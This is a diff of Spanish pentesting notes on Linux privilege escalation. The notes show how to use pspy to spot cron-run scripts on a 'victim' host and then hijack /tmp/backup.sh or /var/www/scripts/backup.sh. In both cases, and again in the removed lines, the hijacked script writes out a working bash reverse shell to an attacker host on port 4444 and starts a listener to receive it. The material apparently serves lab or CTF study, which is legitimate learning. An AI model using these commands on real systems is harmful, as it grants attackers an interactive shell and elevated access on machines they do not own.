@@ -17,6 +17,72 @@ Con el objetivo de reducir las posibilidades de que un atacante lograra explotar
 - Configurar los registros de la tarea cron: se recomienda habilitar la opción de registro para las tareas cron, para poder identificar cualquier actividad sospechosa en las tareas definidas y para poder llevar un registro de las actividades realizadas por cada una de estas.
 ```
 
+## Pspy (IMPORTANTE)
+
+PSPY es una herramienta Linux que monitorea procesos en tiempo real sin necesidad de root.
+
+* [PSPY](https://github.com/DominicBreuker/pspy)
+
+```bash 
+❯ git clone https://github.com/DominicBreuker/pspy
+
+# Transferir el archivo a la máquina víctima Linux 
+❯ cd pspy         # Ir a la carpeta que se ha clonado 
+❯ go build -ldflags "-s -w" .     # Compilar y reducir el tamaño 
+❯ upx pspy        # Aplicar copmpresión al archivo para reducir aun más el tamaño 
+```
+
+### PSPY - Ejemplos de casos 
+```bash 
+❯ ./pspy          # Ejecutar la tool en el servidor víctima 
+	❯ Crtl + c    # Terminar la ejecución 
+
+# Es un monitor de procesos para encontrar tareas automáticas o comandos privilegiados que puedas explotar para escalar privilegios
+	2026/09/22 20:39:02 CMD: UID=1002  PID=5828   | /bin/sh -c /tmp/backup.sh 
+	2026/10/04 23:59:01 CMD: UID=1001  PID=15761  | /bin/sh -c /var/www/scripts/backup.sh 
+
+
+❯ id 1002  # Mirar el nombre del usuario (1002 = user2)          <- CASO 1
+❯ id 1001  # Mirar el nombre del usuario (1002 = plot_admin)     <- CASO 2
+```
+#### CASO 1
+```bash 
+Si no existe el archivo que se esta ejecutando, crearlo y colocarle una shell 
+Paso 1: 
+❯ ls -la /tmp
+
+Paso 2:
+❯ echo '#!/bin/bash' > /tmp/backup.sh
+❯ echo 'bash -i >& /dev/tcp/IP_Kali/4444 0>&1' >> /tmp/backup.sh
+❯ chmod +x /tmp/backup.sh
+
+Paso 3:
+# En Kali levantar el listener para recibir la revershell 
+❯ penelope -p 4444
+```
+#### CASO 2
+```bash 
+Paso 1:
+Si el archivo si existe y somos 'www-data' pero el dir donde se encuentra el archvio esta asi:
+❯ ls -la /var/www/scripts/ 
+	drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
+	drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
+	-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh 
+
+Paso 2:
+# Quiere decir que no se puede modificar directamente el archivo, pero por ser propietarios del dir se puede borrar y hacer uno nuevo
+❯ rm /var/www/scripts/backup.sh
+
+Paso 3:
+❯ echo '#!/bin/bash' > /var/www/scripts/backup.sh
+❯ echo 'bash -i >& /dev/tcp/IP_Kali/4444 0>&1' >> /var/www/scripts/backup.sh
+❯ chmod +x /var/www/scripts/backup.sh
+
+Paso 4:
+# En Kali levantar el listener para recibir la revershell 
+❯ penelope -p 4444
+```
+
 ## Procesos actuales 
 
 ```bash 
@@ -36,42 +102,7 @@ Con el objetivo de reducir las posibilidades de que un atacante lograra explotar
 ❯ rpm -qa | grep <program>     # En sistemas 'rpm' este comando hace lo mismo 
 ```
 
-## Pspy (IMPORTANTE)
-
-PSPY es una herramienta Linux que monitorea procesos en tiempo real sin necesidad de root.
-
-* [PSPY](https://github.com/DominicBreuker/pspy)
-
-```bash 
-❯ git clone https://github.com/DominicBreuker/pspy
-
-# Transferir el archivo a la máquina víctima Linux 
-❯ cd pspy         # Ir a la carpeta que se ha clonado 
-❯ go build -ldflags "-s -w" .     # Compilar y reducir el tamaño 
-❯ upx pspy        # Aplicar copmpresión al archivo para reducir aun más el tamaño 
-```
-
-### PSPY Forma 1
-```bash 
-❯ ./pspy          # Ejecutar la tool en el servidor víctima 
-	❯ Crtl + c    # Terminar la ejecución 
-
-# Es un monitor de procesos para encontrar tareas automáticas o comandos privilegiados que puedas explotar para escalar privilegios
-	2026/09/22 20:39:02 CMD: UID=1002  PID=5828   | /bin/sh -c /tmp/backup.sh 
-	2026/09/22 20:39:02 CMD: UID=1002  PID=5831   | /bin/sh -c /tmp/backup.sh 
-
-❯ id 1002  # Mirar el nombre del usuario (1002 = user2) 
-
-NOTA:
-	- Si no existe el archivo que se esta ejecutando, crearlo y colocarle una shell 
-
-❯ echo '#!/bin/bash' > /tmp/backup.sh
-❯ echo 'bash -i >& /dev/tcp/10.200.98.58/4444 0>&1' >> /tmp/backup.sh
-❯ chmod +x /tmp/backup.sh
-```
-
 ## Tareas CRON 
-
 ```bash 
 # Las tareas CRON son tareas que se ejecutan en el sistema a intervalos regulares de tiempo. Debemos de fijarnos solo en las tareas creadas por el usuario 'root'
 
